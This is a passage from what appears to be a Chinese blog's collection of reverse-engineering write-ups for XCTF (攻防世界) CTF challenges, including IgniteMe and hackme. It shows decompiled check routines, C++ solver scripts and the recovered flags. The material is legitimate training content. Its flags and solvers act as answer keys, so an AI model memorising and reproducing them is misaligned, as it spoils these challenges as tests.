class="line">  uStack16 = <span class="hljs-number">5</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> (sVar1 = <span class="hljs-built_in">strlen</span>(param_1), uStack16 &lt; sVar1) {</span><br><span class="line">    <span class="hljs-keyword">if</span> ((uStack16 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) {</span><br><span class="line">      param_1[uStack16] =</span><br><span class="line">           (byte)((uint)((<span class="hljs-keyword">int</span>)param_1[uStack16] &lt;&lt; <span class="hljs-number">0x1a</span>) &gt;&gt; <span class="hljs-number">0x18</span>) | param_1[uStack16] &gt;&gt; <span class="hljs-number">6</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> {</span><br><span class="line">      param_1[uStack16] =</span><br><span class="line">           param_1[uStack16] &gt;&gt; <span class="hljs-number">2</span> | (byte)((uint)((<span class="hljs-keyword">int</span>)param_1[uStack16] &lt;&lt; <span class="hljs-number">0x1e</span>) &gt;&gt; <span class="hljs-number">0x18</span>);</span><br><span class="line">    }</span><br><span class="line">    uStack16 = uStack16 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  iVar2 = <span class="hljs-built_in">strncmp</span>(param_1 + <span class="hljs-number">5</span>,PTR_DAT_00410d04,<span class="hljs-number">0x1b</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Right!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span> {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>后面对奇数位和偶数位进行了两个不同的位运算，很清晰，仔细分析一下会发现实际上是前后位置的一个交换，并且奇偶运算就是互为逆运算，逆向的时候更方便处理了。最后是进行简单的字符串比较，然后程序就结束了。</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    string target = <span class="hljs-string">"Q|j{g\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f"</span>;</span><br><span class="line">    string flag = <span class="hljs-string">""</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; target.<span class="hljs-built_in">length</span>(); i++) {</span><br><span class="line">        <span class="hljs-keyword">if</span>(i&gt;=<span class="hljs-number">5</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-keyword">int32_t</span> tmp=target[i];</span><br><span class="line">            <span class="hljs-keyword">if</span>(i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                tmp=((tmp&amp;<span class="hljs-number">0x3</span>)&lt;&lt;<span class="hljs-number">6</span>)|((tmp&amp;<span class="hljs-number">0xfc</span>)&gt;&gt;<span class="hljs-number">2</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                tmp=((tmp&amp;<span class="hljs-number">0xc0</span>)&gt;&gt;<span class="hljs-number">6</span>)|((tmp&amp;<span class="hljs-number">0x3f</span>)&lt;&lt;<span class="hljs-number">2</span>);</span><br><span class="line">            }</span><br><span class="line">            flag+=(tmp^(<span class="hljs-number">0x20</span>-i));</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            flag+=(target[i]^(<span class="hljs-number">0x20</span>-i));</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    cout &lt;&lt; flag &lt;&lt; endl;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>需要注意的两点，运算符优先级的问题，加减运算要先于移位运算先于位运算，处理的时候需要注意，还有，移位的时候要注意把多余的位置清0，这里用的是与运算</p><p>输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">qctf</span>{ReA<span class="hljs-number">11</span>y_<span class="hljs-number">4</span>_B@<span class="hljs-number">89</span>_mlp<span class="hljs-number">5</span>_<span class="hljs-number">4</span>_XmAn_}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-re部分题解（二）</title>
      <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>题目有点多，放在一篇里面太过臃肿，所以多分了几篇</p><span id="more"></span><h4 id="IgniteMe"><a href="#IgniteMe" class="headerlink" title="IgniteMe"></a>IgniteMe</h4><p>IDA打开，首先发现flag的格式，<code>EIS{***}</code></p><p>找到关键函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> __cdecl <span class="hljs-title">sub_4011C0</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">size_t</span> v2; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+50h] [ebp-B0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+54h] [ebp-ACh]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+74h] [ebp-8Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+78h] [ebp-88h]</span></span><br><span class="line">  <span class="hljs-keyword">size_t</span> i; <span class="hljs-comment">// [esp+7Ch] [ebp-84h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v8[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [esp+80h] [ebp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(a1) &lt;= <span class="hljs-number">4</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">  i = <span class="hljs-number">4</span>;</span><br><span class="line">  v6 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( i &lt; <span class="hljs-built_in">strlen</span>(a1) - <span class="hljs-number">1</span> )</span><br><span class="line">    v8[v6++] = a1[i++];</span><br><span class="line">  v8[v6] = <span class="hljs-number">0</span>;</span><br><span class="line">  v5 = <span class="hljs-number">0</span>;</span><br><span class="line">  v3 = <span class="hljs-number">0</span>;                                       <span class="hljs-comment">// v8=a1</span></span><br><span class="line">  <span class="hljs-built_in">memset</span>(v4, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )</span><br><span class="line">  {</span><br><span class="line">    v2 = <span class="hljs-built_in">strlen</span>(v8);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( i &gt;= v2 )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v8[i] &gt;= <span class="hljs-string">'a'</span> &amp;&amp; v8[i] &lt;= <span class="hljs-string">'z'</span> )</span><br><span class="line">    {</span><br><span class="line">      v8[i] -= <span class="hljs-number">32</span>;</span><br><span class="line">      v3 = <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v3 &amp;&amp; v8[i] &gt;= <span class="hljs-string">'A'</span> &amp;&amp; v8[i] &lt;= <span class="hljs-string">'Z'</span> )</span><br><span class="line">      v8[i] += <span class="hljs-number">32</span>;<span class="hljs-comment">//大小写互换</span></span><br><span class="line">    v4[i] = byte_4420B0[i] ^ <span class="hljs-built_in">sub_4013C0</span>(v8[i]);<span class="hljs-comment">//唯一一步有用的计算</span></span><br><span class="line">    v3 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">"GONDPHyGjPEKruv{{pj]X@rF"</span>, v4) == <span class="hljs-number">0</span>;</span><br></pre></td></tr></tbody></table></figure><p>据此写脚本逆向</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    string v4=<span class="hljs-string">"GONDPHyGjPEKruv{{pj]X@rF"</span>;</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> byte_4420B0[] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">13</span>,  <span class="hljs-number">19</span>,  <span class="hljs-number">23</span>,  <span class="hljs-number">17</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">1</span>,  <span class="hljs-number">32</span>,  <span class="hljs-number">29</span>,  <span class="hljs-number">12</span>,   <span class="hljs-number">2</span>,</span><br><span class="line">                    <span class="hljs-number">25</span>,  <span class="hljs-number">47</span>,  <span class="hljs-number">23</span>,  <span class="hljs-number">43</span>,  <span class="hljs-number">36</span>,  <span class="hljs-number">31</span>,  <span class="hljs-number">30</span>,  <span class="hljs-number">22</span>,   <span class="hljs-number">9</span>,  <span class="hljs-number">15</span>,</span><br><span class="line">                    <span class="hljs-number">21</span>,  <span class="hljs-number">39</span>,  <span class="hljs-number">19</span>,  <span class="hljs-number">38</span>,  <span class="hljs-number">10</span>,  <span class="hljs-number">47</span>,  <span class="hljs-number">30</span>,  <span class="hljs-number">26</span>,  <span class="hljs-number">45</span>,  <span class="hljs-number">12</span>,</span><br><span class="line">                    <span class="hljs-number">34</span>,   <span class="hljs-number">4</span></span><br><span class="line">            };</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">char</span> v8[v4.<span class="hljs-built_in">length</span>()];</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;v4.<span class="hljs-built_in">length</span>() ; ++i )</span><br><span class="line">    {</span><br><span class="line">        v8[i]=((v4[i]^byte_4420B0[i])<span class="hljs-number">-72</span>)^<span class="hljs-number">0x55</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v8[i] &gt;= <span class="hljs-string">'a'</span> &amp;&amp; v8[i] &lt;= <span class="hljs-string">'z'</span> )</span><br><span class="line">        {</span><br><span class="line">            v8[i] -= <span class="hljs-number">32</span>;</span><br><span class="line">        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(v8[i] &gt;= <span class="hljs-string">'A'</span> &amp;&amp; v8[i] &lt;= <span class="hljs-string">'Z'</span>){</span><br><span class="line">            v8[i] += <span class="hljs-number">32</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">else</span>{</span><br><span class="line">            <span class="hljs-keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;v8&lt;&lt;endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>把输出和我们已知的部分结合起来得到flag</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">EIS</span><span class="hljs-template-variable">{wadx_tdgk_aihc_ihkn_pjlm}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h4><p>通过字符串找到关键部分</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_400F8E</span><span class="hljs-params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v2; <span class="hljs-comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="hljs-comment">// rcx</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// r9</span></span><br><span class="line">  <span class="hljs-keyword">int</span> index; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v8[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [rsp+98h] [rbp-28h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v10; <span class="hljs-comment">// [rsp+9Fh] [rbp-21h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// [rsp+A0h] [rbp-20h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> __int8 v12; <span class="hljs-comment">// [rsp+A6h] [rbp-1Ah]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [rsp+A7h] [rbp-19h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [rsp+A8h] [rbp-18h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [rsp+ACh] [rbp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v17; <span class="hljs-comment">// [rsp+B4h] [rbp-Ch]</span></span><br><span class="line">  _BOOL4 v18; <span class="hljs-comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">printf</span>((<span class="hljs-keyword">unsigned</span> __int64)<span class="hljs-string">"Give me the password: "</span>);</span><br><span class="line">  <span class="hljs-built_in">scanf</span>((__int64)<span class="hljs-string">"%s"</span>, v8, a2);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; v8[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  v18 = i == <span class="hljs-number">22</span>;</span><br><span class="line">  v17 = <span class="hljs-number">10</span>;</span><br><span class="line">  <span class="hljs-keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    index = <span class="hljs-built_in">rand</span>((__int64)<span class="hljs-string">"%s"</span>, (__int64)v8, v2, v3, v4, v5);</span><br><span class="line">    v3 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(index % <span class="hljs-number">22</span>);</span><br><span class="line">    v14 = index % <span class="hljs-number">22</span>;</span><br><span class="line">    v16 = <span class="hljs-number">0</span>;</span><br><span class="line">    v13 = byte_6B4270[index % <span class="hljs-number">22</span>];</span><br><span class="line">    v12 = v8[index % <span class="hljs-number">22</span>];</span><br><span class="line">    v11 = index % <span class="hljs-number">22</span> + <span class="hljs-number">1</span>;</span><br><span class="line">    v15 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v15 &lt; v11 )</span><br><span class="line">    {</span><br><span class="line">      ++v15;</span><br><span class="line">      v16 = <span class="hljs-number">1828812941</span> * v16 + <span class="hljs-number">12345</span>;</span><br><span class="line">    }</span><br><span class="line">    v2 = v16;</span><br><span class="line">    v10 = v16 ^ v12;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v13 != ((<span class="hljs-keyword">unsigned</span> __int8)v16 ^ v12) )</span><br><span class="line">      v18 = <span class="hljs-number">0</span>;</span><br><span class="line">    --v17;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">while</span> ( v17 );</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v18 )</span><br><span class="line">    v9 = <span class="hljs-built_in">printf</span>((<span class="hljs-keyword">unsigned</span> __int64)<span class="hljs-string">"Congras\n"</span>);</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">    v9 = <span class="hljs-built_in">printf</span>((<span class="hljs-keyword">unsigned</span> __int64)<span class="hljs-string">"Oh no!\n"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>就是个简单的运算，写个脚本逆运算一下就出来了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> byte_6B4270[] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">95</span>, <span class="hljs-number">242</span>,  <span class="hljs-number">94</span>, <span class="hljs-number">139</span>,  <span class="hljs-number">78</span>,  <span class="hljs-number">14</span>, <span class="hljs-number">163</span>, <span class="hljs-number">170</span>, <span class="hljs-number">199</span>, <span class="hljs-number">147</span>,</span><br><span class="line">                    <span class="hljs-number">129</span>,  <span class="hljs-number">61</span>,  <span class="hljs-number">95</span>, <span class="hljs-number">116</span>, <span class="hljs-number">163</span>,   <span class="hljs-number">9</span>, <span class="hljs-number">145</span>,  <span class="hljs-number">43</span>,  <span class="hljs-number">73</span>,  <span class="hljs-number">40</span>,</span><br><span class="line">                    <span class="hljs-number">147</span>, <span class="hljs-number">103</span></span><br><span class="line">            };</span><br><span class="line">    <span class="hljs-keyword">char</span> v13;</span><br><span class="line">    <span class="hljs-keyword">char</span> v12;</span><br><span class="line">    <span class="hljs-keyword">char</span> v8[<span class="hljs-number">23</span>];</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v16=<span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">22</span>;i++)</span><br><span class="line">    {</span><br><span class="line">        v16=<span class="hljs-number">0</span>;</span><br><span class="line">        v13=byte_6B4270[i];</span><br><span class="line">        <span class="hljs-keyword">int</span> v11=i+<span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">int</span> v15=<span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">while</span>(v15&lt;v11){</span><br><span class="line">            ++v15;</span><br><span class="line">            v16=<span class="hljs-number">1828812941</span> * v16 + <span class="hljs-number">12345</span>;</span><br><span class="line">        }</span><br><span class="line">        v8[i]=v13^v16;</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;v8&lt;&lt;endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{d<span class="hljs-number">826</span>e<span class="hljs-number">6926098</span>ef<span class="hljs-number">46</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p>还是通过字符串找到关键函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_401080</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// kr00_4</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// esi</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// al</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// eax</span></span><br><span class="line">  __int128 v7; <span class="hljs-comment">// [esp+2h] [ebp-24h]</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// [esp+12h] [ebp-14h]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [esp+1Ah] [ebp-Ch]</span></span><br><span class="line">  __int16 v10; <span class="hljs-comment">// [esp+1Eh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"input："</span>, v7);</span><br><span class="line">  v9 = <span class="hljs-number">0</span>;</span><br><span class="line">  v10 = <span class="hljs-number">0</span>;</span><br><span class="line">  v7 = <span class="hljs-number">0</span>i64;</span><br><span class="line">  v8 = <span class="hljs-number">0</span>i64;</span><br><span class="line">  <span class="hljs-built_in">scanf</span>((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;dword_402158, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)&amp;v7);</span><br><span class="line">  v0 = <span class="hljs-built_in">strlen</span>((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;v7);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v0 &gt;= <span class="hljs-number">16</span> &amp;&amp; v0 == <span class="hljs-number">24</span> )                   <span class="hljs-comment">// flag共24位</span></span><br><span class="line">  {</span><br><span class="line">    v1 = <span class="hljs-number">0</span>;</span><br><span class="line">    v2 = (<span class="hljs-keyword">char</span> *)&amp;v8 + <span class="hljs-number">7</span>;</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">      v3 = *v2--;</span><br><span class="line">      byte_40336C[v1++] = v3;                   